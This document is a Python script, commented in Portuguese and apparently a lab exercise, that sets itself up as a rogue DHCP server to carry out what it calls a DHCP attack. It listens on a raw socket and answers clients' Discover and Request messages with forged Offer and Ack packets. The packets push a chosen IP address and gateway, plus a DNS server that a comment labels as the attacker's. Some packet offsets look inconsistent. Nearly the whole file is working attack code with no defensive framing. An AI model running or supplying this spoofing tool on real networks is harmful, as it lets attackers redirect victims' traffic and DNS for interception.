import socket
import struct
import random
import sys
import uuid

def get_mac_address():
    mac_int = uuid.getnode()  # Get the MAC address as a 48-bit integer
    mac_bytes = mac_int.to_bytes(6, byteorder='big')  # Convert to bytes

    # Format the bytes as '\x1c\x1b\x0d\xf1\x9a\xb0'
    formatted_mac = b''.join([bytes([int(b)]) for b in mac_bytes])
    return formatted_mac

# Funções auxiliares para calcular o checksum dos pacotes IP
def calculate_checksum(msg):
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + (msg[i+1])
        s = s + w

    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff

    return s

# Criação do socket RAW para interceptar pacotes DHCP
def create_socket(server_ip):
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
    s.bind((server_ip, 67)) 
    s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    print("Socket Criado...")
    return s

# Função para criar pacotes DHCP Offer
def create_dhcp_offer(transaction_id, server_mac, client_mac, server_ip, offered_ip, mascara, router_ip, dns_ip):
    # Eth header
    dest_mac = client_mac
    src_mac = server_mac
    eth_type = b'\x08\x00'  # IPv4

    eth_header = dest_mac + src_mac + eth_type

    # IP header 
    version_ihl = (4 << 4) + 5
    tos = 0
    total_length = 0  
    packet_id = random.randint(0, 65535)
    fragment_offset = 0
    ttl = 64
    protocol = socket.IPPROTO_UDP
    source_ip = socket.inet_aton(server_ip)
    dest_ip = b'\xff\xff\xff\xff'  # Broadcast

    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, packet_id, fragment_offset, ttl, protocol, 0, source_ip, dest_ip)

    ip_checksum = calculate_checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, packet_id, fragment_offset, ttl, protocol, ip_checksum, source_ip, dest_ip)

    # UDP header
    source_port = 67
    dest_port = 68
    length = 0  
    checksum = 0

    udp_header = struct.pack('!HHHH', source_port, dest_port, length, checksum)

    # DHCP header
    op = b'\x02'              
    htype = b'\x01'           
    hlen = b'\x06'            
    hops = b'\x00'
    xid = transaction_id  
    secs = b'\x00\x00'
    flags = b'\x00\x00'       
    ciaddr = b'\x00\x00\x00\x00'
    yiaddr = socket.inet_aton(offered_ip)
    siaddr = socket.inet_aton(server_ip)
    giaddr = b'\x00\x00\x00\x00'
    chaddr = client_mac + b'\x00' * 10
    sname = b'\x00' * 64
    file = b'\x00' * 128
    magic_cookie = b'\x63\x82\x53\x63'  

    dhcp_header = op + htype + hlen + hops + xid + secs + flags + ciaddr + yiaddr + siaddr + giaddr + chaddr + sname + file + magic_cookie

    # DHCP options
    options = b''
    options += b'\x35\x01\x02'  # DHCP Offer
    options += b'\x01\x04' + socket.inet_aton(mascara)  # Mascara
    options += b'\x3a\x04\x00\x00\x07\x08'  # Renewal Time Value
    options += b'\x3b\x04\x00\x00\x0c\x4e'  # Rebinding Time Value
    options += b'\x33\x04\x00\x00\x0e\x10'  # Lease time
    options += b'\x36\x04' + socket.inet_aton(server_ip)    # DHCP Server
    options += b'\x03\x04' + socket.inet_aton(router_ip)  # Router
    options += b'\x06\x08' + socket.inet_aton(dns_ip) + socket.inet_aton(dns_ip) # DNS server
    options += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' # padding
    options += b'\xff'  # End option
    options += b'\x00\x00\x00\x00' # padding

    # Calculate UDP length and checksum
    udp_length = 8 + len(dhcp_header) + len(options)
    pseudo_header = source_ip + dest_ip + struct.pack('!BBH', 0, protocol, udp_length)
    udp_checksum = calculate_checksum(pseudo_header + udp_header + dhcp_header + options)
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, udp_checksum)

    # Pacote final
    packet = eth_header + ip_header + udp_header + dhcp_header + options

    print("Enviando Pacote: ", packet)

    return packet


# Função para criar pacotes DHCP Acknowledgement
def create_dhcp_ack(transaction_id, server_mac, client_mac, server_ip, offered_ip, mascara, router_ip, dns_ip):
    dest_mac = client_mac
    src_mac = server_mac
    eth_type = b'\x08\x00'  # IPv4

    eth_header = dest_mac + src_mac + eth_type

    # IP header
    version_ihl = (4 << 4) + 5
    tos = 0
    total_length = 0 
    packet_id = random.randint(0, 65535)
    fragment_offset = 0
    ttl = 64
    protocol = socket.IPPROTO_UDP
    source_ip = socket.inet_aton(server_ip)
    dest_ip = b'\xff\xff\xff\xff'  # Broadcast

    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, packet_id, fragment_offset, ttl, protocol, 0, source_ip, dest_ip)

    ip_checksum = calculate_checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s', version_ihl, tos, total_length, packet_id, fragment_offset, ttl, protocol, ip_checksum, source_ip, dest_ip)

    # UDP header
    source_port = 67
    dest_port = 68
    length = 0 
    checksum = 0

    udp_header = struct.pack('!HHHH', source_port, dest_port, length, checksum)

    #DHCP header 
    op = b'\x02'              
    htype = b'\x01'           
    hlen = b'\x06'            
    hops = b'\x00'
    xid = transaction_id  
    secs = b'\x00\x00'
    flags = b'\x80\x00'       # Broadcast flag
    ciaddr = b'\x00\x00\x00\x00'
    yiaddr = socket.inet_aton(offered_ip)
    siaddr = socket.inet_aton(server_ip)
    giaddr = b'\x00\x00\x00\x00'
    chaddr = client_mac + b'\x00' * 10
    sname = b'\x00' * 64
    file = b'\x00' * 128

    dhcp_header = op + htype + hlen + hops + xid + secs + flags + ciaddr + yiaddr + siaddr + giaddr + chaddr + sname + file

    # DHCP options
    options = b''
    options += b'\x63\x82\x53\x63'  # Magic cookie
    options += b'\x35\x01\x05'  # DHCP Ack
    options += b'\x01\x04' + socket.inet_aton(mascara)  # Mascara
    options += b'\x03\x04' + socket.inet_aton(router_ip)  # Router
    options += b'\x06\x04' + socket.inet_aton(dns_ip)  # DNS server
    options += b'\x33\x04\x00\x00\x0e\x10'  # Lease time
    options += b'\xff'  # End 

    # Calculate UDP length and checksum
    udp_length = 8 + len(dhcp_header) + len(options)
    pseudo_header = source_ip + dest_ip + struct.pack('!BBH', 0, protocol, udp_length)
    udp_checksum = calculate_checksum(pseudo_header + udp_header + dhcp_header + options)
    udp_header = struct.pack('!HHHH', source_port, dest_port, udp_length, udp_checksum)

    # Pacote final
    packet = eth_header + ip_header + udp_header + dhcp_header + options

    return packet


# Função principal para executar o ataque DHCP
def dhcp_attack():
    hostname = socket.gethostname()

    server_ip = socket.gethostbyname(hostname)
    s = create_socket(server_ip)
    print("SERVER IP: ", server_ip)
    print("Servidor em execução...")

    server_mac = get_mac_address()
    print("Server MAC: ", server_mac)

    # Dados
    offered_ip = '192.168.1.100'
    mascara = '255.255.255.0'
    router_ip = '192.168.1.1'
    dns_ip = '8.8.8.8'      # DNS DO SERVIDOR ATACANTE

    while True:
        try:
            print("Escutando...")
            packet, addr = s.recvfrom(4096)

            print("Pacote Recebido:", packet)
            print("Endereço:", addr)

            message_type = packet[284-14]
            print("Message Type: ", message_type)

            ## dados do header eth
            eth_header = packet[0:14]

            ## dados do header ip
            ip_header = packet [15:34]

            #transaction_id = dhcp_header[4:8]
            transaction_id = packet[46-14:50-14]
            print("Transaction ID: ", transaction_id.hex())
            client_mac = packet[70-14:76-14]
            print("Client MAC: ", client_mac.hex())


            # Envia Pacotes
            if message_type == 1:
                print(f'DHCP Discover recebido de {addr}, enviando DHCP Offer')
                offer_packet = create_dhcp_offer(transaction_id, server_mac, client_mac, server_ip, offered_ip, mascara, router_ip, dns_ip)
                s.sendto(offer_packet, ('<broadcast>', 68))

            elif message_type == 3:
                print(f'DHCP Request recebido de {addr}, enviando DHCP Acknowledgement')
                ack_packet = create_dhcp_ack(transaction_id, server_mac, client_mac, server_ip, offered_ip, mascara, router_ip, dns_ip)
                s.sendto(ack_packet, ('<broadcast>', 68))
        
        except BlockingIOError:
            pass

if __name__ == "__main__":
   try:
       dhcp_attack()
   except PermissionError:
       print("Erro: Este programa deve ser executado com privilégios de superusuário.")
       sys.exit(1)
